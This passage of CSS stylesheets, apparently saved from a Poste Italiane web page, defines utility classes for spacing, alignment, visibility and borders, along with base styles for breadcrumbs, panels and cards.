    .spacer-lg-05 {
        margin: 5px !important;
    }
    .spacer-lg-top-05 {
        margin-top: 5px !important;
    }
    .spacer-lg-bottom-05 {
        margin-bottom: 5px !important;
    }
    .spacer-lg-left-05 {
        margin-left: 5px !important;
    }
    .spacer-lg-right-05 {
        margin-right: 5px !important;
    }
    /*margin 10*/
    .spacer-lg-10 {
        margin: 10px !important;
    }
    .spacer-lg-top-10 {
        margin-top: 10px !important;
    }
    .spacer-lg-bottom-10 {
        margin-bottom: 10px !important;
    }
    .spacer-lg-left-10 {
        margin-left: 10px !important;
    }
    .spacer-lg-right-10 {
        margin-right: 10px !important;
    }
    /*margin 15*/
    .spacer-lg-15 {
        margin: 15px !important;
    }
    .spacer-lg-top-15 {
        margin-top: 15px !important;
    }
    .spacer-lg-bottom-15 {
        margin-bottom: 15px !important;
    }
    .spacer-lg-left-15 {
        margin-left: 15px !important;
    }
    .spacer-lg-right-15 {
        margin-right: 15px !important;
    }
    /*margin 20*/
    .spacer-lg-20 {
        margin: 20px !important;
    }
    .spacer-lg-top-20 {
        margin-top: 20px !important;
    }
    .spacer-lg-bottom-20 {
        margin-bottom: 20px !important;
    }
    .spacer-lg-left-20 {
        margin-left: 20px !important;
    }
    .spacer-lg-right-20 {
        margin-right: 20px !important;
    }
    /*margin 25*/
    .spacer-lg-25 {
        margin: 25px !important;
    }
    .spacer-lg-top-25 {
        margin-top: 25px !important;
    }
    .spacer-lg-bottom-25 {
        margin-bottom: 25px !important;
    }
    .spacer-lg-left-25 {
        margin-left: 25px !important;
    }
    .spacer-lg-right-25 {
        margin-right: 25px !important;
    }
    /*margin 30*/
    .spacer-lg-30 {
        margin: 30px !important;
    }
    .spacer-lg-top-30 {
        margin-top: 30px !important;
    }
    .spacer-lg-bottom-30 {
        margin-bottom: 30px !important;
    }
    .spacer-lg-left-30 {
        margin-left: 30px !important;
    }
    .spacer-lg-right-30 {
        margin-right: 30px !important;
    }
    /*margin 35*/
    .spacer-lg-35 {
        margin: 35px !important;
    }
    .spacer-lg-top-35 {
        margin-top: 35px !important;
    }
    .spacer-lg-bottom-35 {
        margin-bottom: 35px !important;
    }
    .spacer-lg-left-35 {
        margin-left: 35px !important;
    }
    .spacer-lg-right-35 {
        margin-right: 35px !important;
    }
    /*margin 40*/
    .spacer-lg-40 {
        margin: 40px !important;
    }
    .spacer-lg-top-40 {
        margin-top: 40px !important;
    }
    .spacer-lg-bottom-40 {
        margin-bottom: 40px !important;
    }
    .spacer-lg-left-40 {
        margin-left: 40px !important;
    }
    .spacer-lg-right-40 {
        margin-right: 40px !important;
    }
    /*margin 100*/
    .spacer-lg-100 {
        margin: 100px !important;
    }
    .spacer-lg-top-100 {
        margin-top: 100px !important;
    }
    .spacer-lg-bottom-100 {
        margin-bottom: 100px !important;
    }
    .spacer-lg-left-100 {
        margin-left: 100px !important;
    }
    .spacer-lg-right-100 {
        margin-right: 100px !important;
    }
    /*padding 0*/
    .innerspacer-lg-0 {
        padding: 0 !important;
    }
    .innerspacer-lg-top-0 {
        padding-top: 0 !important;
    }
    .innerspacer-lg-bottom-0 {
        padding-bottom: 0 !important;
    }
    .innerspacer-lg-left-0 {
        padding-left: 0 !important;
    }
    .innerspacer-lg-right-0 {
        padding-right: 0 !important;
    }
    /*padding 05*/
    .innerspacer-lg-05 {
        padding: 5px !important;
    }
    .innerspacer-lg-top-05 {
        padding-top: 5px !important;
    }
    .innerspacer-lg-bottom-05 {
        padding-bottom: 5px !important;
    }
    .innerspacer-lg-left-05 {
        padding-left: 5px !important;
    }
    .innerspacer-lg-right-05 {
        padding-right: 5px !important;
    }
    /*padding 10*/
    .innerspacer-lg-10 {
        padding: 10px !important;
    }
    .innerspacer-lg-top-10 {
        padding-top: 10px !important;
    }
    .innerspacer-lg-bottom-10 {
        padding-bottom: 10px !important;
    }
    .innerspacer-lg-left-10 {
        padding-left: 10px !important;
    }
    .innerspacer-lg-right-10 {
        padding-right: 10px !important;
    }
    /*padding 15*/
    .innerspacer-lg-15 {
        padding: 15px !important;
    }
    .innerspacer-lg-top-15 {
        padding-top: 15px !important;
    }
    .innerspacer-lg-bottom-15 {
        padding-bottom: 15px !important;
    }
    .innerspacer-lg-left-15 {
        padding-left: 15px !important;
    }
    .innerspacer-lg-right-15 {
        padding-right: 15px !important;
    }
    /*padding 20*/
    .innerspacer-lg-20 {
        padding: 20px !important;
    }
    .innerspacer-lg-top-20 {
        padding-top: 20px !important;
    }
    .innerspacer-lg-bottom-20 {
        padding-bottom: 20px !important;
    }
    .innerspacer-lg-left-20 {
        padding-left: 20px !important;
    }
    .innerspacer-lg-right-20 {
        padding-right: 20px !important;
    }
    /*padding 25*/
    .innerspacer-lg-25 {
        padding: 25px !important;
    }
    .innerspacer-lg-top-25 {
        padding-top: 25px !important;
    }
    .innerspacer-lg-bottom-25 {
        padding-bottom: 25px !important;
    }
    .innerspacer-lg-left-25 {
        padding-left: 25px !important;
    }
    .innerspacer-lg-right-25 {
        padding-right: 25px !important;
    }
    /*padding 30*/
    .innerspacer-lg-30 {
        padding: 30px !important;
    }
    .innerspacer-lg-top-30 {
        padding-top: 30px !important;
    }
    .innerspacer-lg-bottom-30 {
        padding-bottom: 30px !important;
    }
    .innerspacer-lg-left-30 {
        padding-left: 30px !important;
    }
    .innerspacer-lg-right-30 {
        padding-right: 30px !important;
    }
    /*padding 35*/
    .innerspacer-lg-35 {
        padding: 35px !important;
    }
    .innerspacer-lg-top-35 {
        padding-top: 35px !important;
    }
    .innerspacer-lg-bottom-35 {
        padding-bottom: 35px !important;
    }
    .innerspacer-lg-left-35 {
        padding-left: 35px !important;
    }
    .innerspacer-lg-right-35 {
        padding-right: 35px !important;
    }
    /*padding 40*/
    .innerspacer-lg-40 {
        padding: 40px !important;
    }
    .innerspacer-lg-top-40 {
        padding-top: 40px !important;
    }
    .innerspacer-lg-bottom-40 {
        padding-bottom: 40px !important;
    }
    .innerspacer-lg-left-40 {
        padding-left: 40px !important;
    }
    .innerspacer-lg-right-40 {
        padding-right: 40px !important;
    }
    /*padding 50*/
    .innerspacer-lg-50 {
        padding: 50px !important;
    }
    .innerspacer-lg-top-40 {
        padding-top: 50px !important;
    }
    .innerspacer-lg-bottom-50 {
        padding-bottom: 50px !important;
    }
    .innerspacer-lg-left-50 {
        padding-left: 50px !important;
    }
    .innerspacer-lg-right-50 {
        padding-right: 50px !important;
    }
}


/****************** limit xs ******************/

@media (max-width: 767px) {
    .auto-heigth-xs {
        min-height: auto!important;
    }
    .container-xs-fluid {
        width: auto!important;
    }
}


/****************** limit sm ******************/

@media (min-width: 768px) and (max-width: 991px) {
    .auto-heigth-sm {
        min-height: auto!important;
    }
    .container-sm-fluid {
        width: auto!important;
    }
}


/****************** limit md ******************/

@media (min-width: 992px) and (max-width: 1199px) {
    .auto-heigth-md {
        min-height: auto!important;
    }
    .container-md-fluid {
        width: auto!important;
    }
}


/****************** limit lg ******************/

@media (min-width: 1200px) {
    .auto-heigth-lg {
        min-height: auto!important;
    }
    .container-lg-fluid {
        width: auto!important;
    }
}
/*savepage-import-url=/risorse_dt/condivise/stili/trasversali/alignment.css*//*****************************************************

    Foglio stile Allineamenti - (c) Poste Italiane 2016/2017/2018 - GD//FS//DU

*****************************************************/

.center{
    margin: 0 auto;
}

/****************** xs ******************/

.pull-xs-left {
    float: left !important;
}

.pull-xs-right {
    float: right !important;
}

.pull-xs-not {
    float: none !important;
}

.text-left-xs-not,
.text-center-xs-not,
.text-right-xs-not,
.text-justify-xs-not {
    text-align: inherit !important;
}

.text-xs-left {
    text-align: left !important;
}

.text-xs-center {
    text-align: center !important;
}

.text-xs-right {
    text-align: right !important;
}

.text-xs-justify {
    text-align: justify !important;
}


/****************** sm ******************/

@media (min-width: 768px) {
    .pull-sm-left {
        float: left !important;
    }
    .pull-sm-right {
        float: right !important;
    }
    .pull-sm-not {
        float: none !important;
    }
    .text-left-sm-not,
    .text-center-sm-not,
    .text-right-sm-not,
    .text-justify-sm-not {
        text-align: inherit !important;
    }
    .text-sm-left {
        text-align: left !important;
    }
    .text-sm-center {
        text-align: center !important;
    }
    .text-sm-right {
        text-align: right !important;
    }
    .text-sm-justify {
        text-align: justify !important;
    }
}


/****************** md ******************/

@media (min-width: 992px) {
    .pull-md-left {
        float: left !important;
    }
    .pull-md-right {
        float: right !important;
    }
    .pull-md-not {
        float: none !important;
    }
    .text-left-md-not,
    .text-center-md-not,
    .text-right-md-not,
    .text-justify-md-not {
        text-align: inherit !important;
    }
    .text-md-left {
        text-align: left !important;
    }
    .text-md-center {
        text-align: center !important;
    }
    .text-md-right {
        text-align: right !important;
    }
    .text-md-justify {
        text-align: justify !important;
    }
}


/****************** lg ******************/

@media (min-width: 1200px) {
    .pull-lg-left {
        float: left !important;
    }
    .pull-lg-right {
        float: right !important;
    }
    .pull-lg-not {
        float: none !important;
    }
    .text-left-lg-not,
    .text-center-lg-not,
    .text-right-lg-not,
    .text-justify-lg-not {
        text-align: inherit !important;
    }
    .text-lg-left {
        text-align: left !important;
    }
    .text-lg-center {
        text-align: center !important;
    }
    .text-lg-right {
        text-align: right !important;
    }
    .text-lg-justify {
        text-align: justify !important;
    }
}
/*savepage-import-url=/risorse_dt/condivise/stili/trasversali/extra.css*//*****************************************************

    Foglio stile Extra - (c) Poste Italiane 2016/2017/2018 - GD//FS//DU

*****************************************************/


/*xs*/

.hide {
    display: none !important;
}

.inline {
    display: inline !important;
}

.inline-block {
    display: inline-block!important;
}

.block {
    display: block !important;
}

.nojs-block {
    display: block !important;
}

.nojs-inline {
    display: inline !important;
}

.nojs-inline-block {
    display: inline-block !important;
}

.relative {
    position: relative !important;
}

.seo-element {
    text-indent: -9999px !important;
}


/*xs*/

@media (max-width: 767px) {
    .hide-xs {
        display: none !important;
    }
    .inline-xs {
        display: inline !important;
    }
    .inline-block-xs {
        display: inline-block!important;
    }
    .block-xs {
        display: block !important;
    }
    .border-xs-bottom {
        border-bottom: 1px solid #ececec !important;
    }
    .border-xs-bottom-not {
        border-bottom: none !important;
    }
    .border-xs-left {
        border-left: 1px solid #ececec !important;
    }
    .border-xs-left-not {
        border-left: none !important;
    }
    .border-xs-right {
        border-right: 1px solid #ececec !important;
    }
    .border-xs-right-not {
        border-right: none !important;
    }
    .border-xs-top {
        border-top: 1px solid #ececec !important;
    }
    .border-xs-top-not {
        border-top: none !important;
    }
    .nojs-xs-block {
        display: block !important;
    }
    .nojs-xs-inline {
        display: inline !important;
    }
    .nojs-xs-inline-block {
        display: inline-block !important;
    }
}


/*sm*/

@media (min-width: 768px) {
    .hide-sm {
        display: none !important;
    }
    .inline-sm {
        display: inline !important;
    }
    .inline-block-sm {
        display: inline-block!important;
    }
    .block-sm {
        display: block !important;
    }
    .border-sm-bottom {
        border-bottom: 1px solid #ececec !important;
    }
    .border-sm-bottom-not {
        border-bottom: none !important;
    }
    .border-sm-left {
        border-left: 1px solid #ececec !important;
    }
    .border-sm-left-not {
        border-left: none !important;
    }
    .border-sm-right {
        border-right: 1px solid #ececec !important;
    }
    .border-sm-right-not {
        border-right: none !important;
    }
    .border-sm-top {
        border-top: 1px solid #ececec !important;
    }
    .border-sm-top-not {
        border-top: none !important;
    }
    .nojs-sm-block {
        display: block !important;
    }
    .nojs-sm-inline {
        display: inline !important;
    }
    .nojs-sm-inline-block {
        display: inline-block !important;
    }
}


/*md*/

@media (min-width: 991px) {
    .hide-md {
        display: none !important;
    }
    .inline-md {
        display: inline !important;
    }
    .inline-block-md {
        display: inline-block!important;
    }
    .block-md {
        display: block !important;
    }
    .border-md-bottom {
        border-bottom: 1px solid #ececec !important;
    }
    .border-md-bottom-not {
        border-bottom: none !important;
    }
    .border-md-left {
        border-left: 1px solid #ececec !important;
    }
    .border-md-left-not {
        border-left: none !important;
    }
    .border-md-right {
        border-right: 1px solid #ececec !important;
    }
    .border-md-right-not {
        border-right: none !important;
    }
    .border-md-top {
        border-top: 1px solid #ececec !important;
    }
    .border-md-top-not {
        border-top: none !important;
    }
    .nojs-md-block {
        display: block !important;
    }
    .nojs-md-inline {
        display: inline !important;
    }
    .nojs-md-inline-block {
        display: inline-block !important;
    }
}


/*lg*/

@media (min-width: 1200px) {
    .hide-lg {
        display: none !important;
    }
    .inline-lg {
        display: inline !important;
    }
    .inline-block-lg {
        display: inline-block!important;
    }
    .block-lg {
        display: block !important;
    }
    .border-lg-bottom {
        border-bottom: 1px solid #ececec !important;
    }
    .border-lg-bottom-not {
        border-bottom: none !important;
    }
    .border-lg-left {
        border-left: 1px solid #ececec !important;
    }
    .border-lg-left-not {
        border-left: none !important;
    }
    .border-lg-right {
        border-right: 1px solid #ececec !important;
    }
    .border-lg-right-not {
        border-right: none !important;
    }
    .border-lg-top {
        border-top: 1px solid #ececec !important;
    }
    .border-lg-top-not {
        border-top: none !important;
    }
    .nojs-lg-block {
        display: block !important;
    }
    .nojs-lg-inline {
        display: inline !important;
    }
    .nojs-lg-inline-block {
        display: inline-block !important;
    }
}
/*savepage-import-url=/risorse_dt/condivise/stili/trasversali/base-element.css*//**************************************************************

    Foglio stile Base -  (c) Poste Italiane 2016-2019 - GD//FS//DU
    [release v 1.34]

***************************************************************/

/* Colori base */

/*
/*  base bg  : #ececec (grigio scuro)
/*  base bg  : #f6f6f6 (grigio chiaro)
/*  base bg  : #ffffff (bianco)
/*  base bg  : #d9e4f5 (celeste)
/*  testo : #222427 (grigio scuro)
/*  testo : #4a4a4a (grigio medio-scuro)
/*  testo : #787878 (grigio medio-chiaro)
/*  testo : #d0d0d0 (grigio chiaro)
/*  testo : #fff
/*  testo : #0047bb (blu)
/*  testo : #00328e (blu)
/*  btn : #eedc00 (giallo base)
/*  btn : #ffec00 (giallo hover)
/*  btn : #222427 (grigio)
/*  warning color   : #ffb906
/*  error color     : #ff3636
/*  success color   : #26b158
/*  info color      : #0047bb
/*  */

/***************************/

/******* Generici *******/

/***************************/

html {
    background-color: #ececec;
}

body {
    height: 100%;
    overflow: auto;
    background-color: #f6f6f6;
    line-height: 1.2;
}

.seo-element,
.content-seo {
    position: absolute;
    height: 1px;
    width: 1px;
    left: -9999px;
    text-indent: -9999px;
}

.well {
    background-color: #fbfbfb;
    border: 1px solid #ececec;
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    -ms-border-radius: 0px;
    border-radius: 0px;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
    padding: 15px;
}

.caret {
    margin-left: 4px;
}

.img-smalled {
    width: 12px;
}

.no-transform {
    text-transform: none !important;
}

.main-pills .onlayer {
    margin-right: -40px !important;
    margin-left: -40px !important;
}

.main-pills-basic .onlayer {
    margin-right: 0px !important;
    margin-left: 0px !important;
}

.onlayer .panel {
    border-left: none !important;
    border-right: none !important;
}

.other a,
.show-other {
    background-image: url("/risorse_dt/condivise/immagini/icone/icone-tonde-16-blue/ico-freccia-blu.png");
    background-position: right 0;
    background-repeat: no-repeat;
    background-size: 16px;
    font-size: 16px;
    padding: 0 25px 0 0;
}

.other a {
    background-image: url("/risorse_dt/condivise/immagini/icone/icone-tonde-16-blue/ico-freccia-blu.png");
}

.show-other a {
    background-image: url("/risorse_dt/condivise/immagini/icone/icone-tonde-16-blue/ico-piu-blu.png");
}

/***************************/

/******* Alert browser *******/

/***************************/

.content-alert-browser {
    position: fixed;
    bottom: 0;
    left: 0;
    width: 100%;
    z-index: 10;
    min-height: 0;
}

.content-alert-browser .content-alert-old-browser {
    display: none;
    background-color: #f45d20;
    color: #fff;
}

.content-alert-browser .content-alert-cookie {
    border-top: 3px solid #eedc00;
    display: block;
    opacity: 1;
    width: 100%;
    z-index: 5;
    padding: 10px 0px 10px 0px;
    background-color: #f6f6f6;
}

.content-alert-browser .content-alert-cookie #alertCookie-confirm {
    cursor: pointer;
    height: 27px;
    line-height: 15px;
    padding: 3px 6px;
    position: absolute;
    right: 10px;
    box-sizing: border-box;
    top: 0px;
    font-weight: bold;
    font-size: 24px;
}

.content-alert-browser .content-alert-old-browser #alertIe {
    background-image: url("/risorse_dt/condivise/immagini/icone/icone-bisogni-white-2x/ico-creare-pensione@2x.png");
    background-position: left center;
    background-repeat: no-repeat;
    background-size: 50px;
    padding-left: 80px;
}

.content-alert-browser .content-alert-old-browser #alertIe a {
    color: #fff;
    text-decoration: underline;
}

.content-alert-browser .content-alert-old-browser #alertIe p {
    padding: 10px 0 0;
}


/***************************/

/******* Macro contenitori *******/

/***************************/

.content-header {
    background-color: #eedc00;
    height: 70px;
    z-index: 1042;
    position: relative;
}

.content-applicative,
.content-main {
    padding: 60px 0 25px;
}

.nohero,
.noanchor {
    /*padding-top: 0 !important;*/
}

.noanchor.nohero {
    padding-top: 0 !important;
}

.content-post-main {
    padding: 20px 0 55px;
}

.content-grey,
.content-white,
.content-color,
.content-bg {
    padding: 60px 0 70px;
}

.content-grey,
.col-grey,
.box-grey {
    background-color: #ececec;
}

.content-white,
.col-white,
.bg-white {
    background-color: #fff;
}

.content-color,
.col-color {
    background-color: #d9e4f5;
}

.content-bg {
    background-repeat: no-repeat;
    background-position: center;
    background-size: cover;
    min-height: 250px;
}

.content-bg-dark .box-editable-area,
.content-bg-dark .box-editable-area h2 {
    color: #fff;
}

.content-bg-light .box-editable-area,
.content-bg-light .box-editable-area h2 {
    color: #222427;
}

.content-overflow {
    width: 100%;
    /*overflow-x: hidden;*/
}

.column-overflow {
    overflow-y: scroll;
}

.content-overflow ul.list-responsive {
    white-space: nowrap;
}

.col-xs-1,
.col-sm-1,
.col-md-1,
.col-lg-1,
.col-xs-2,
.col-sm-2,
.col-md-2,
.col-lg-2,
.col-xs-3,
.col-sm-3,
.col-md-3,
.col-lg-3,
.col-xs-4,
.col-sm-4,
.col-md-4,
.col-lg-4,
.col-xs-5,
.col-sm-5,
.col-md-5,
.col-lg-5,
.col-xs-6,
.col-sm-6,
.col-md-6,
.col-lg-6,
.col-xs-7,
.col-sm-7,
.col-md-7,
.col-lg-7,
.col-xs-8,
.col-sm-8,
.col-md-8,
.col-lg-8,
.col-xs-9,
.col-sm-9,
.col-md-9,
.col-lg-9,
.col-xs-10,
.col-sm-10,
.col-md-10,
.col-lg-10,
.col-xs-11,
.col-sm-11,
.col-md-11,
.col-lg-11,
.col-xs-12,
.col-sm-12,
.col-md-12,
.col-lg-12 {
    min-height: 0px;
}

fieldset,
.fieldset {
    /*border-bottom: 1px solid #787878;*/
    border-bottom: 1px solid #ececec;
}

fieldset {
    padding: 0px 0px 35px;
    margin-bottom: 55px;
}

.fieldset {
    padding: 0px 0px 15px;
    margin-bottom: 35px;
}

fieldset {
    /*fix to table responsive webkit/firefox bug*/
    display: table-column;
    width: 100%;
}

.pi-ie fieldset {
    display: block;
}

fieldset:last-child {
    border-bottom: none;
    margin-bottom: 15px;
    padding: 0px 0px 15px;
}

.fieldset:last-child {
    border-bottom: none;
    margin-bottom: 5px;
    padding: 0px 0px 5px;
}

.title-line {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/line-bg.png*/ url();
    background-position: center;
    background-repeat: repeat-x;
    text-align: center;
    margin-bottom: 30px;
}

.title-line span {
    background-color: #fff;
    padding: 0 10px;
    margin-left: 10px;
}

.navbar {
    min-height: auto;
}

.video-wrap {
    background-color: #000;
    height: 100%;
    width: 100%;
    position: static;
    top: 0;
    left: 0;
}

.ellipsis {
    white-space: nowrap;
    text-overflow: ellipsis;
    overflow: hidden;
}

.ellipsis-not {
    white-space: normal;
    text-overflow: inherit;
    overflow: inherit;
}


/* Azure video skin minimale */

.vjs-control-bar,
.vjs-caption-settings {
    display: none;
}

.vjs-loading-spinner {
    display: none;
    background: /*savepage-url=/risorse_dt/condivise/immagini/generiche/spinner_bianco.gif*/ url();
    background-size: cover;
    position: absolute;
    top: 50%;
    left: 50%;
    width: 48px;
    height: 48px;
    margin-left: -24px;
    margin-top: -24px
}

.vjs-loading .vjs-loading-spinner,
.vjs-waiting .vjs-loading-spinner,
.vjs-seeking .vjs-loading-spinner {
    display: block;
}

.vjs-error .vjs-loading-spinner {
    display: none;
}


/***************************/

/******* Allineamenti verticali  *******/

/***************************/

.table-like {
    display: table;
    width: 100%;
}

.table-like .tablerow-like {
    display: table-row;
}

.table-like .tablecell-like {
    display: table-cell;
    vertical-align: middle;
}

.vam {
    vertical-align: middle !important;
}

.vat {
    vertical-align: top !important;
}


/***************************/

/******* BreadCrumb *******/

/***************************/

.breadcrumb {
    margin-bottom: 0;
    background-color: transparent;
    padding: 10px 0;
}

.breadcrumb li {
    font-size: 16px;
    position: relative;
}

.breadcrumb > li img {
    width: 24px;
}

.breadcrumb > li.active span {
    display: inline-block;
    vertical-align: middle;
}

.breadcrumb > li + li::before {
    background-image: url(/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right@2x.png);
    background-position: left 6px top 3px;
    background-repeat: no-repeat;
    background-size: 8px 12px;
    content: " ";
    padding: 0 12px;
}

.breadcrumb li a {
    color: #222427;
    display: inline-block;
}


/* BreadCrumb type a - Trim totale */

.breadcrumb.breadcrumb-trim-a li + li:not(:last-child) span[name="trim"] {
    text-indent: -9999px;
    padding: 0;
    vertical-align: middle;
    width: 100%;
    height: 100%;
    position: absolute;
    top: 0;
    left: 10px;
    display: block;
    z-index: 2;
}

.breadcrumb.breadcrumb-trim-a li + li:not(:last-child):after {
    content: "...";
}

.breadcrumb.breadcrumb-trim-a li + li:not(:last-child):hover:after {
    content: "";
}

.breadcrumb.breadcrumb-trim-a li + li:not(:last-child):hover span[name="trim"] {
    text-indent: 0px;
    position: relative;
    left: auto;
}


/* BreadCrumb type b - Trim su larghezza (controllo presenza span escludendo l'ultimo elemento) */

.breadcrumb.breadcrumb-trim-b li + li:not(:last-child) span[name="trim"] {
    display: inline-block;
    padding: 0;
    vertical-align: middle;
    max-width: 60px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
}

.breadcrumb.breadcrumb-trim-b li + li:not(:last-child) span[name="trim"]:hover {
    max-width: none;
}


/***************************/

/******* Pannelli Base *******/

/***************************/

.panel {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
    box-shadow: none;
}

.panel-default {
    border-color: #ececec;
}

.panel-tools {
    background: #fff;
    border-top: 1px solid #ececec;
}

.panel-tools .panel-heading {
    padding: 10px 15px;
    min-height: 70px;
}

.panel-tools .panel-heading label {
    color: #222427;
}

.panel-tools-static .panel-heading {
    padding: 10px 0px;
}

.panel-tools-static .panel-heading .text-oversize {
    font-size: 30px;
}

.panel-tools-static .panel-heading .tablecell-like {
    height: 70px;
    display: table-cell;
    vertical-align: middle;
}

.panel-tools-static .panel-heading .radio,
.panel-tools-static .panel-heading .checkbox {
    margin: 0 !important;
    line-height: 70px;
}

.panel-tools-separator {
    padding: 40px 0px 10px;
}

.panel-cart-separator {
    padding-bottom: 15px;
}

.panel-group .panel.panel-tools + .panel.panel-tools {
    margin-top: 0;
}

.panel-group .panel.panel-tools {
    -webkit-border-radius: 0px;
    -moz-border-radius: 0px;
    border-radius: 0px;
}


/* Cards */

.panel-cards {
    border: 1px solid #ececec;
    position: relative;
    -webkit-transition: box-shadow 0.5s linear;
    -o-transition: box-shadow 0.5s linear;
    -moz-transition: box-shadow 0.5s linear;
    -ms-transition: box-shadow 0.5s linear;
    -kthtml-transition: box-shadow 0.5s linear;
    transition: box-shadow 0.5s linear;
    margin-bottom: 30px;
}

.panel-cards-ticket {
    border: 1px solid #f6f6f6;
    overflow: hidden;
}

.panel-cards-basic,
.panel-cards-default,
.panel-cards-services,
.panel-cards-assistance,
.panel-cards-news,
.panel-cards-media,
.panel-cards-bg-double,
.panel-cards-bg-full,
.panel-cards-bg {
    min-height: 222px;
}

.panel-cards-opacity {
    min-height: 350px !important;
    /*override in equalize group*/
    background-repeat: no-repeat;
    background-position: center;
    background-size: cover;
}

.panel-cards-default-icon,
.panel-cards-edge {
    min-height: 182px;
}

.panel-cards-services {
    margin-bottom: 0;
}

.panel-cards-category {
    min-height: auto;
    margin-bottom: 15px;
}

.panel-cards-cart {
    padding-bottom: 15px;
}

.panel-cards-services .img-responsive,
.panel-cards-assistance .img-responsive {
    margin: 0 auto;
}

.content-overflow-wrap div.col-md-4:last-child .panel-cards-assistance,
.content-overflow-wrap div.col-sm-6:last-child .panel-cards-assistance,
.content-overflow-wrap div.col-xs-12:last-child .panel-cards-assistance {
    margin-bottom: 0;
}

.panel-cards-basic .panel-wrap,
.panel-cards-default .panel-wrap,
.panel-cards-default-icon .panel-wrap,
.panel-cards-services .panel-wrap,
.panel-cards-assistance .panel-wrap,
.panel-cards-news .panel-wrap,
.panel-cards-bg-double .panel-wrap {
    padding: 30px 30px 45px 30px;
}

.panel-cards-category .panel-wrap {
    padding: 15px 30px 15px 30px;
}

.panel-cards-bg-promo .panel-wrap {
    padding: 30px 30px 45px 0px;
    position: relative;
}

.panel-cards-media .panel-wrap {
    padding: 30px;
}

.panel-cards-large .panel-wrap {
    padding: 5px 30px 50px 30px;
}

.panel-cards-xlarge .panel-wrap {
    padding: 5px 40px 45px 40px;
}

.panel-cards-opacity .panel-wrap {
    padding: 30px 40px 35px 40px;
}

.panel-cards-medium .panel-wrap {
    padding: 5px 30px 45px 30px;
}

.panel-cards-ticket .panel-wrap {
    position: relative;
    border: 1px solid #ececec;
    padding: 30px;
}

.panel-cards-media.nopanel-link .panel-wrap {
    padding: 30px;
}

.panel-cards-news.nopanel-link .panel-wrap {
    padding: 30px;
}


/* panel edge default is grey */

.panel-cards-edge {
    padding: 30px 30px 30px 24px;
    border-style: solid;
    border-color: #ececec #ececec #ececec #d9e4f5;
    border-width: 1px 1px 1px 7px;
    position: relative;
    background: #fff;
}

.panel-cards-edge.panel-cards-edge-cyan {
    border-color: #ececec #ececec #ececec #d9e4f5;
}

.panel-cards-edge.panel-cards-edge-yellow {
    border-color: #ececec #ececec #ececec #eedc00;
}

.panel-cards-edge.panel-cards-edge-white {
    border-color: #ececec;
    border-width: 1px;
    padding-left: 30px;
}

.panel-cards-appointment .panel-wrap,
.panel-cards-boxed .panel-wrap {
    padding: 5px 30px 30px;
}

.panel-cards-boxed-flat .panel-wrap {
    padding: 30px;
}

.panel-cards-boxed-nav .panel-wrap {
    padding: 0px;
}

.panel-cards-cart .panel-wrap {
    padding: 10px 30px;
}

.panel-cards-bg-full .panel-wrap,
.panel-cards-bg .panel-wrap {
    padding: 15px 30px 30px;
}

.panel-cards-opacity .panel-wrap {
    background-color: rgba(255, 255, 255, 0.8);
    position: absolute;
    bottom: 0;
    right: 0;
    width: 100%;
    -webkit-transition: all 0.4s ease-out;
    -o-transition: all 0.4s ease-out;
    -moz-transition: all 0.4s ease-out;
    -ms-transition: all 0.4s ease-out;
    -kthtml-transition: all 0.4s ease-out;
    transition: all 0.4s ease-out;
}

.panel-cards-opacity:hover .panel-wrap {
    background-color: rgba(255, 255, 255, 0.95);
    -webkit-transition: all 0.4s ease-out;
    -o-transition: all 0.4s ease-out;
    -moz-transition: all 0.4s ease-out;
    -ms-transition: all 0.4s ease-out;
    -kthtml-transition: all 0.4s ease-out;
    transition: all 0.4s ease-out;
}


/*
.panel-cards-opacity .panel-wrap::after {
    background-color: rgba(255, 255, 255, 0.8);
    width: 100%;
    position: absolute;
    height: 1px;
    display: block;
    content: "";
    bottom: 0;
    left: 0;
}
*/

.panel-cards-opacity .panel-wrap .extra-info {
    max-height: 0;
    overflow: hidden;
    -webkit-transition: all 0.4s ease-out;
    -o-transition: all 0.4s ease-out;
    -moz-transition: all 0.4s ease-out;
    -ms-transition: all 0.4s ease-out;
    -kthtml-transition: all 0.4s ease-out;
    transition: all 0.4s ease-out;
}

.panel-cards-opacity:hover .panel-wrap .extra-info {
    max-height: 150px;
    -webkit-transition: all 0.4s ease-in;
    -o-transition: all 0.4s ease-in;
    -moz-transition: all 0.4s ease-in;
    -ms-transition: all 0.4s ease-in;
    -kthtml-transition: all 0.4s ease-in;
    transition: all 0.4s ease-in;
}

.panel-cards-bg .panel-wrap-pre,
.panel-cards-bg-full .panel-wrap-pre {
    padding: 30px 30px 10px;
}

.panel-cards-appointment .panel-wrap-pre,
.panel-cards-boxed .panel-wrap-pre,
.panel-cards-cart .panel-wrap-pre {
    padding: 10px 30px 10px;
}

.panel-cards-cart .panel-wrap-pre {
    margin-bottom: 10px;
}

.panel-cards-bg .panel-wrap-pre,
.panel-cards-appointment .panel-wrap-pre,
.panel-cards-boxed .panel-wrap-pre,
.panel-cards-cart .panel-wrap-pre {
    background-color: #ececec;
}

.panel-cards-boxed-nav .panel-wrap-pre{
    background-color: #eedc00;
}

.panel-cards-xlarge .panel-wrap-pre {
    background-repeat: no-repeat;
    background-position: center;
    background-size: cover;
    height: 250px;
}

.panel-cards-ticket .rounded-square {
    display: block;
    height: 20px;
    width: 20px;
    background-color: #f6f6f6;
    z-index: 2;
    -webkit-border-radius: 10px;
    -moz-border-radius: 10px;
    border-radius: 10px;
    border: 1px solid #ececec;
    position: absolute;
    top: 46%;
}

.panel-cards-ticket .rounded-square-left {
    right: -7px;
}

.panel-cards-ticket .rounded-square-right {
    left: -7px;
}

.panel-cards .panel-link .btn-card span {
    display: block;
    background-color: #eedc00;
    color: #222427;
    font-size: 14px;
    font-weight: bold;
    line-height: 24px;
    padding: 3px 34px 3px 20px;
    text-transform: uppercase;
    line-height: 24px;
    -webkit-border-radius: 15px 0 0 15px;
    -moz-border-radius: 15px 0 0 15px;
    border-radius: 15px 0 0 15px;
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
    background-position: right 13px center;
    background-repeat: no-repeat;
    background-size: 9px 14px;
    outline: none;
}

.panel-cards:hover .panel-link .btn-card span:hover,
